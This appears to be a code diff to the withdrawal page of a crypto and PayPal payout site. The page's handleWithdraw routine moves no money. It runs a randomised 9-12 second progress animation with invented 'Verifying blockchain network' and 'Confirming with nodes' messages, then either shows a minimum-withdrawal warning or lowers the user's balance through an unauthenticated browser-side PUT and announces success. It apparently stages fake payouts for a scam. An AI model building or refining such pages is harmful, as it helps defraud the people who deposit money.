@@ -165,13 +165,14 @@
         .network-details { font-size: 10px; color: #6b7280; margin-top: 4px; }
         body.dark-mode .network-details { color: #9ca3af; }
         
+        /* Professional Transparent Loading Overlay */
         .loading-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(255, 255, 255, 0.96);
+            background: rgba(0, 0, 0, 0.75);
             backdrop-filter: blur(12px);
             z-index: 20000;
             display: none;
@@ -181,21 +182,18 @@
             opacity: 0;
             transition: opacity 0.3s ease;
         }
-        body.dark-mode .loading-overlay { background: rgba(0, 0, 0, 0.96); }
+        body.dark-mode .loading-overlay {
+            background: rgba(0, 0, 0, 0.85);
+        }
         .loading-overlay.active { display: flex; opacity: 1; }
-        .loading-spinner { width: 70px; height: 70px; border: 3px solid rgba(59,130,246,0.2); border-top: 3px solid #3b82f6; border-radius: 50%; animation: spin 1s linear infinite; }
-        body.dark-mode .loading-spinner { border: 3px solid rgba(252,213,53,0.2); border-top: 3px solid #FCD535; }
+        .loading-spinner { width: 70px; height: 70px; border: 3px solid rgba(252,213,53,0.2); border-top: 3px solid #FCD535; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .loading-progress { width: 220px; height: 4px; background: #e2e8f0; border-radius: 4px; margin-top: 30px; overflow: hidden; }
-        body.dark-mode .loading-progress { background: #2B3139; }
-        .loading-progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #3b82f6, #2563eb); border-radius: 4px; transition: width 0.05s linear; }
-        body.dark-mode .loading-progress-fill { background: linear-gradient(90deg, #FCD535, #F0B90B); }
-        .loading-text { font-size: 13px; font-weight: 600; color: #3b82f6; margin-top: 20px; letter-spacing: 1px; }
-        body.dark-mode .loading-text { color: #FCD535; }
-        .loading-subtext { font-size: 11px; color: #6b7280; margin-top: 8px; }
+        .loading-progress { width: 220px; height: 4px; background: rgba(255,255,255,0.2); border-radius: 4px; margin-top: 30px; overflow: hidden; }
+        .loading-progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #FCD535, #F0B90B); border-radius: 4px; transition: width 0.05s linear; }
+        .loading-text { font-size: 13px; font-weight: 600; color: #FCD535; margin-top: 20px; letter-spacing: 1px; }
+        .loading-subtext { font-size: 11px; color: rgba(255,255,255,0.6); margin-top: 8px; }
         .loading-dots { display: flex; gap: 8px; margin-top: 16px; }
-        .loading-dot { width: 6px; height: 6px; background: #3b82f6; border-radius: 50%; animation: bounce 1.4s infinite ease-in-out; }
-        body.dark-mode .loading-dot { background: #FCD535; }
+        .loading-dot { width: 6px; height: 6px; background: #FCD535; border-radius: 50%; animation: bounce 1.4s infinite ease-in-out; }
         .loading-dot:nth-child(1) { animation-delay: 0s; }
         .loading-dot:nth-child(2) { animation-delay: 0.2s; }
         .loading-dot:nth-child(3) { animation-delay: 0.4s; }
@@ -404,12 +402,12 @@
     </div>
 </div>
 
-<!-- Loading Overlay -->
+<!-- Professional Transparent Loading Overlay -->
 <div id="loadingOverlay" class="loading-overlay">
     <div class="loading-spinner"></div>
     <div class="loading-progress"><div class="loading-progress-fill" id="loadingProgressFill"></div></div>
-    <div class="loading-text" id="loadingStatusText">Processing withdrawal...</div>
-    <div class="loading-subtext" id="loadingSubtext">Verifying transaction</div>
+    <div class="loading-text" id="loadingStatusText">Verifying blockchain network...</div>
+    <div class="loading-subtext" id="loadingSubtext">Please wait...</div>
     <div class="loading-dots"><div class="loading-dot"></div><div class="loading-dot"></div><div class="loading-dot"></div></div>
 </div>
 
@@ -425,7 +423,6 @@
     </div>
 </div>
 
-<!-- Help Modal -->
 <div id="helpModal" class="modal">
     <div class="modal-content help-modal-content">
         <div class="flex justify-between items-center mb-4"><h3 class="text-xl font-bold text-gray-900">Withdrawal Guide</h3><i class="fas fa-times text-gray-400 cursor-pointer hover:text-gray-600" id="closeHelpModal"></i></div>
@@ -485,7 +482,12 @@
     const networkDropdownMenu = document.getElementById('networkDropdownMenu');
     const selectedNetworkDisplay = document.getElementById('selectedNetworkDisplay');
 
-    const loadingMessages = ["Verifying blockchain network...", "Encrypting transaction data...", "Broadcasting to network...", "Confirming with nodes...", "Finalizing withdrawal..."];
+    // CHANGED: Only 3 loading messages (step 1, 4, 5)
+    const loadingMessages = [
+        "Verifying blockchain network...",
+        "Confirming with nodes...",
+        "Finalizing withdrawal..."
+    ];
 
     function initNetworkDropdown() {
         networkDropdownBtn.addEventListener('click', (e) => { e.stopPropagation(); networkDropdownMenu.classList.toggle('active'); });
@@ -530,7 +532,60 @@
 
     async function updateDatabaseBalance(newBalanceCents) { try { const response = await fetch(`${API_URL}?ignore_cache=1`); const users = await response.json(); const userIndex = users.findIndex(u => u.Email && u.Email.toLowerCase() === currentUserEmail.toLowerCase()); if (userIndex !== -1) { const rowNumber = userIndex + 2; await fetch(`${API_URL}/${rowNumber}`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ Balance: newBalanceCents }) }); } } catch (error) { console.error('Error updating balance:', error); } }
 
-    async function handleWithdraw() { if (isLoading) return; const amount = parseFloat(withdrawAmount?.value) || 0; const minRequired = getMinimumWithdrawal(); if (amount <= 0) { showToast('Please enter a valid amount', false); return; } if (amount > currentBalance) { showToast('Amount exceeds your balance', false); return; } if (currentMethod === 'crypto') { const address = cryptoAddress?.value?.trim(); if (!address) { showToast('Please enter a wallet address', false); return; } if (!isValidBitcoinAddress(address)) { showToast('Invalid Bitcoin address', false); return; } } else { const email = paypalEmail?.value?.trim(); if (!email) { showToast('Please enter a PayPal email', false); return; } if (!isValidEmail(email)) { showToast('Invalid email address', false); return; } } isLoading = true; const duration = Math.floor(Math.random() * (9000 - 6000 + 1) + 6000); const startTime = Date.now(); loadingOverlay.classList.add('active'); loadingProgressFill.style.width = '0%'; const progressInterval = setInterval(() => { const elapsed = Date.now() - startTime; const progress = Math.min(100, (elapsed / duration) * 100); loadingProgressFill.style.width = `${progress}%`; const messageIndex = Math.min(loadingMessages.length - 1, Math.floor(progress / (100 / loadingMessages.length))); loadingStatusText.textContent = loadingMessages[messageIndex]; loadingSubtext.textContent = `Estimated time: ${Math.ceil((duration - elapsed) / 1000)}s`; }, 50); setTimeout(() => { clearInterval(progressInterval); loadingProgressFill.style.width = '100%'; loadingStatusText.textContent = 'Complete!'; setTimeout(() => { loadingOverlay.classList.remove('active'); isLoading = false; if (amount < minRequired) { modalMinRequired.innerText = `$${minRequired.toLocaleString(undefined, { minimumFractionDigits: 2 })}`; modalBalance.innerText = `$${currentBalance.toLocaleString(undefined, { minimumFractionDigits: 2 })}`; modalWithdrawAmount.innerText = `$${amount.toLocaleString(undefined, { minimumFractionDigits: 2 })}`; warningModal.classList.add('active'); } else { const totalFee = currentMethod === 'crypto' ? currentNetworkFee + 2.50 : 2.50; const newBalance = currentBalance - amount; const newBalanceCents = Math.round(newBalance * 100); updateDatabaseBalance(newBalanceCents); showToast('Withdrawal submitted successfully!', true); setTimeout(() => { window.location.href = 'dashboard.html'; }, 1500); } }, 500); }, duration); }
+    async function handleWithdraw() { 
+        if (isLoading) return; 
+        const amount = parseFloat(withdrawAmount?.value) || 0; 
+        const minRequired = getMinimumWithdrawal(); 
+        if (amount <= 0) { showToast('Please enter a valid amount', false); return; } 
+        if (amount > currentBalance) { showToast('Amount exceeds your balance', false); return; } 
+        if (currentMethod === 'crypto') { 
+            const address = cryptoAddress?.value?.trim(); 
+            if (!address) { showToast('Please enter a wallet address', false); return; } 
+            if (!isValidBitcoinAddress(address)) { showToast('Invalid Bitcoin address', false); return; } 
+        } else { 
+            const email = paypalEmail?.value?.trim(); 
+            if (!email) { showToast('Please enter a PayPal email', false); return; } 
+            if (!isValidEmail(email)) { showToast('Invalid email address', false); return; } 
+        } 
+        
+        isLoading = true; 
+        // CHANGED: 9-12 seconds random duration
+        const duration = Math.floor(Math.random() * (12000 - 9000 + 1) + 9000); 
+        const startTime = Date.now(); 
+        loadingOverlay.classList.add('active'); 
+        loadingProgressFill.style.width = '0%'; 
+        
+        const progressInterval = setInterval(() => { 
+            const elapsed = Date.now() - startTime; 
+            const progress = Math.min(100, (elapsed / duration) * 100); 
+            loadingProgressFill.style.width = `${progress}%`; 
+            const messageIndex = Math.min(loadingMessages.length - 1, Math.floor(progress / (100 / loadingMessages.length))); 
+            loadingStatusText.textContent = loadingMessages[messageIndex]; 
+        }, 50); 
+        
+        setTimeout(() => { 
+            clearInterval(progressInterval); 
+            loadingProgressFill.style.width = '100%'; 
+            loadingStatusText.textContent = 'Complete!'; 
+            setTimeout(() => { 
+                loadingOverlay.classList.remove('active'); 
+                isLoading = false; 
+                if (amount < minRequired) { 
+                    modalMinRequired.innerText = `$${minRequired.toLocaleString(undefined, { minimumFractionDigits: 2 })}`; 
+                    modalBalance.innerText = `$${currentBalance.toLocaleString(undefined, { minimumFractionDigits: 2 })}`; 
+                    modalWithdrawAmount.innerText = `$${amount.toLocaleString(undefined, { minimumFractionDigits: 2 })}`; 
+                    warningModal.classList.add('active'); 
+                } else { 
+                    const totalFee = currentMethod === 'crypto' ? currentNetworkFee + 2.50 : 2.50; 
+                    const newBalance = currentBalance - amount; 
+                    const newBalanceCents = Math.round(newBalance * 100); 
+                    updateDatabaseBalance(newBalanceCents); 
+                    showToast('Withdrawal submitted successfully!', true); 
+                    setTimeout(() => { window.location.href = 'dashboard.html'; }, 1500); 
+                } 
+            }, 500); 
+        }, duration); 
+    }
 
     maxBtn?.addEventListener('click', () => { withdrawAmount.value = currentBalance.toFixed(2); calculateSummary(); });
     withdrawAmount?.addEventListener('input', calculateSummary);
